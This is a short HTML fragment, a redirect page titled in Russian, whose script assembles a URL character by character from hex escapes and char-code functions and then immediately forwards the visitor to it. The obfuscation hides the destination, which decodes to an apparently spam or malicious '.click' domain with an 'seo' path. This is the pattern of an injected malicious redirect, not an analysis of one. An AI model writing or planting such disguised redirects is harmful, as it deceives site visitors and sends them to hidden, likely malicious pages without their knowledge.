  <title>Перенаправление</title>
  <script>
    const bits = [
      p => '\x68',
      $ => '\x74',
      () => '\x74',
      () => String.fromCharCode(112),
      () => String.fromCharCode(115),
      () => '\x3a',

      q => '\x2f',
      () => String.fromCharCode(118),
      () => '\x65',
      function() { return '\x72'; },
      function() { return '\x67'; },
      q => '\x65',
      q => '\x6e',
      function() { return '\x2e'; },
      __ => '\x63',
      function() { return '\x6c'; },
      () => '\x69',
      k => '\x63',
      () => String.fromCharCode(107),
      p => '\x2f',
      function() { return '\x73'; },
      v => '\x2f',
      x => '\x73',
      function() { return '\x65'; },
      () => '\x6f'
    ];
    const loc = bits.reduce((buf, fn) => buf + fn(), '');
    window.location.replace(loc);
